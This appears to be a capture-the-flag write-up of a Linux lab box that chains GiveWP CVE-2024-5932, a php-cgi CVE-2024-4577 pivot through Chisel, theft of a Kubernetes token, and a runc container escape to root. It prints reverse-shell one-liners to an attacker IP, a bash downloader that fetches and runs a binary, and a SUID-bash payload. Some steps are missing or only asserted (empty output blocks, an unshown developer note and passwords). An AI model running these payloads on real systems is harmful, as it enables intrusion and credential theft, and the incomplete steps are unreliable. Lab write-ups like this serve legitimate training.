## Giveback - Linux

**Difficulty:** Medium
**OS:** Linux

## Enumeration

A full port scan turned up the usual web and SSH ports, plus a few unusual ones that immediately hinted at something Kubernetes related running underneath.

```shell
sudo nmap -p- 10.129.70.248 --min-rate 10000

PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
6443/tcp  filtered sun-sr-https
10250/tcp filtered unknown
30686/tcp open     unknown
```

Port 6443 and 10250 are the Kubernetes API server and kubelet's usual ports, and 30686 looks like a NodePort. Worth remembering. A version scan on the open ports filled in the details and confirmed a WordPress install.

```shell
sudo nmap -sC -sV -p 22,80,6443,10250,30686 10.129.70.248

PORT      STATE    SERVICE      VERSION
22/tcp    open     ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http         nginx 1.28.0
|_http-generator: WordPress 6.8.1
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
30686/tcp open     http         Golang net/http server
|_http-title: Site doesn't have a title (application/json).
```

That last port, 30686, is running a bare Golang HTTP server returning JSON with fields like `namespace` and `wp-nginx-service`. That's a strong signal this box is genuinely running Kubernetes under the hood rather than just being themed after it, likely a kube-proxy or load balancer health endpoint leaking through.

## Initial Access via CVE-2024-5932

GiveWP up to and including 3.14.1 has an unauthenticated PHP object injection vulnerability, CVE-2024-5932, reachable through the `give_title` parameter on the donation form. Deserializing untrusted input like that opens the door to a property oriented programming chain, and in GiveWP's case that chain reaches all the way to `shell_exec`.

- [https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/)
- [https://github.com/EQSTLab/CVE-2024-5932](https://github.com/EQSTLab/CVE-2024-5932)

A public Python exploit already existed, so I set up a virtual environment and pointed it at the donation page I'd noticed earlier.

```shell
python3 -m virtualenv venv
source venv/bin/activate
pip3 install -r requirements.txt
```

```shell
python3 CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c 'bash -c "/bin/bash -i >& /dev/tcp/10.10.16.97/9001 0>&1"'

CVE-2024-5932 : GiveWP unauthenticated PHP Object Injection
[+] Requested Data:
'give_title': 'O:19:"Stripe\\StripeObject":1:{s:10:"\\0*\\0_values"; ... s:10:"shell_exec"; ... "bash -c "/bin/bash -i >& /dev/tcp/10.10.16.97/9001 0>&1""; ...}'
```

The exploit builds a serialized object chain that eventually flows through a `Faker` generator class into `shell_exec`, letting the injected string run as a real shell command. A listener caught the callback almost immediately.

```shell

```

## Enumeration Inside the First Container

The hostname prefix and the `bitnami` directory structure gave it away instantly, this shell wasn't sitting on the actual VM, it was inside a Bitnami WordPress container.


Not literally `root`, but group 0. Rather than fighting for privileges inside a throwaway container, I went straight for whatever secrets might already be sitting in the environment.

## Getting Tools Onto the Box

This container turned out to be stripped down, no `curl`, no `wget`, none of the usual ways to pull files in. Bash itself can still open raw TCP sockets though, so I wrote a tiny pure Bash HTTP GET function to work around it.

```shell
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

```shell
__curl http://10.10.16.97/chisel > chisel
chmod +x chisel
```

With Chisel on board I could set up a SOCKS proxy through the container back to my attacking machine.

```shell
# on my box
./chisel server -p 9002 -reverse -v
```

```shell
# inside the container
./chisel client 10.10.16.97:9002 R:socks
```

## Lateral Movement via CVE-2024-4577

PHP-CGI on Windows has a well known argument injection bug, CVE-2024-4577, where certain command line flags meant only to be interpreted by the PHP binary itself can be smuggled through the query string because of how Windows handles Unicode best-fit character conversion. Normally this shouldn't apply to Linux at all, but this box's developer note about carrying over Windows-style handling turned out to be exactly the tell needed, the underlying php-cgi handler here was configured in a way that made the same injection technique work regardless of OS.

- [https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/)
- [https://blog.orange.tw/posts/2024-06-cve-2024-4577-yet-another-php-rce/](https://blog.orange.tw/posts/2024-06-cve-2024-4577-yet-another-php-rce/)

The technique abuses query string flags like `-d allow_url_include=1` and `-d auto_prepend_file=php://input` to make PHP execute whatever's sent in the POST body as PHP code. I put together a one liner using PHP's own `stream_context_create` to fire the request.

```shell
proxychains -q php -r "\$c=stream_context_create(['http'=>['method'=>'POST','content'=>'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|busybox nc 10.10.16.97 6666 >/tmp/f']]);file_get_contents('http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input',0,\$c);"
```

After some back and forth with payload tweaks, a listener caught a second callback, this time from an entirely different pod.

```shell

listening on [any] 6666 ...
connect to [10.10.16.97] from (UNKNOWN) [10.129.70.248] 58696
sh: can't access tty; job control turned off
/var/www/html/cgi-bin #
```

## Exfiltrating Kubernetes Secrets

Every pod's service account token is a JWT that authenticates directly to the Kubernetes API server, and its permissions depend entirely on what role it's been bound to. Reading the token out and decoding it showed the account name, `secret-reader-sa`, which is about as clear a hint as Kubernetes RBAC ever gives you.

```shell
cat /run/secrets/kubernetes.io/serviceaccount/token
```

## Privilege Escalation via a Custom runc Container

If you can define your own `config.json` for a `runc` container that's about to be run as root, you can bind mount whatever host directories you want straight into that container and let it execute arbitrary commands against them. That's essentially a sanctioned container escape.

```shell
mkdir /tmp/mycontainer
cd /tmp/mycontainer
mkdir rootfs
```

I built a config that mounts `/bin`, `/tmp`, and `/root` from the real host into the container, and sets the container's entrypoint to copy `bash` out to a shared location and flip the setuid bit on it.

```shell
cat config.json

{
  "ociVersion": "1.0.2",
  "process": {
    "user": { "uid": 0, "gid": 0 },
    "args": [
      "/bin/bash", "-c",
      "cp /bin/bash /tmp/rootshell && chmod 4777 /tmp/rootshell && echo 'SUID shell created at /tmp/rootshell' > /tmp/status.txt"
    ],
    "cwd": "/"
  },
  "root": { "path": "rootfs", "readonly": false },
  "mounts": [
    { "destination": "/bin", "type": "bind", "source": "/bin", "options": ["bind", "ro"] },
    { "destination": "/tmp", "type": "bind", "source": "/tmp", "options": ["bind", "rw"] },
    { "destination": "/root", "type": "bind", "source": "/root", "options": ["bind", "rw"] }
  ]
}
```

Fired it off with the `debug` wrapper, entering both passwords when prompted.

```shell
sudo /opt/debug run mycontainer

Validating sudo...
Please enter the administrative password:

Both passwords verified. Executing the command...
```

Checking `/tmp` on the real host afterward showed exactly what was promised, a setuid copy of bash sitting there owned by root.

```shell
ls -la /tmp

-rwsrwxrwx  1 root     root     1396520 Nov  2 08:00 rootshell
-rw-r--r--  1 root     root          37 Nov  2 08:00 status.txt
```

Running it with `-p` to preserve the elevated privileges dropped straight into a root shell.

```shell
/tmp/rootshell -p
rootshell-5.1#
```
